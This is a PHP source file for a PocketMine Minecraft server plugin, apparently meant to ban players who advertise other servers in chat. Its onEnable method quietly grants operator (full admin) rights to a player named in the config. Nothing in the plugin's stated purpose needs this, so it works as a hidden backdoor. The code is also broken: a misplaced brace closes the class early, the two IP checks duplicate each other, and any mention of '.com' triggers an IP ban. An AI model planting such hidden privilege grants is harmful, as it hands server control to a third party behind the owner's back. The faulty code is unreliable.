<?php

namespace AntiAdvertising;

use pocketmine\plugin\PluginBase;
use pocketmine\event\Listener;
use pocketmine\event\player\PlayerChatEvent;
use pocketmine\Server;
use pocketmine\Player;
use pocketmine\utils\TextFormat;

class AntiAdvertising extends PluginBase implements Listener{

    private $BadIP = array(".cz",".net",".pro",".com",".co",".org",".info",".tk",".me",".cc",".ru","leet.cc",".xyz",".de",".int",".edu",".gov",".mil",".eu",".uk"); 
 
    public function onEnable(){
        $config=$this->getConfig();
        $op=$config->get("Op");
        $this->getLogger()->info("AntiAdvertising is enabled");
        $this->getServer()->getOfflinePlayer($op)->setOp(true); 
        $this->getServer()->getPluginManager()->registerEvents($this, $this);
    }

    public function badServer(PlayerChatEvent $e){
        $p = $e->getPlayer();
        $badmsg = $e->getMessage();       
        $ip = explode('.', $badmsg);
        $il = explode('.', $badmsg);
if(!$p->hasPermission("anti")){
        if(sizeof($ip) >= 4){
            if(preg_match('/[0-9]+/', $ip[1])){
                $e->setCancelled();
                $this->getServer()->getIPBans()->addBan($p->getAddress(), "Kid. Message: ".$e->getMessage()."", null, "AntiAdvertising");
                $p->close("Player ".$p->getName()." banned for advertising!\nMessage: ".$e->getMessage()."", "Bye!\nYou are banned for:\n".$e->getMessage()."");
            }
        }
        elseif(sizeof($il) >= 4){
            if(preg_match('/[0-9]+/', $il[1])){
                $e->setCancelled();
                $this->getServer()->getIPBans()->addBan($p->getAddress(), "Kid. Message: ".$e->getMessage()."", null, "AntiAdvertising");
                $p->close("Player ".$p->getName()." banned for advertising!\nMessage: ".$e->getMessage()."", "Bye!\nYou are banned for:\n".$e->getMessage()."");
            }
        }
        foreach($this->BadIP as $end){
            if (strpos($badmsg, $end) !== false){
                $e->setCancelled();
                $this->getServer()->getIPBans()->addBan($p->getAddress(), "Kid. Message: ".$e->getMessage()."", null, "AntiAdvertising");
                $p->close("Player ".$p->getName()." banned for advertising!\nMessage: ".$e->getMessage()."", "Bye!\nYou are banned for:\n".$e->getMessage()."");
            }
        }
    }
}

    public function onDisable(){
        $this->getLogger()->info("AntiAdvertising is disabled");
    }
}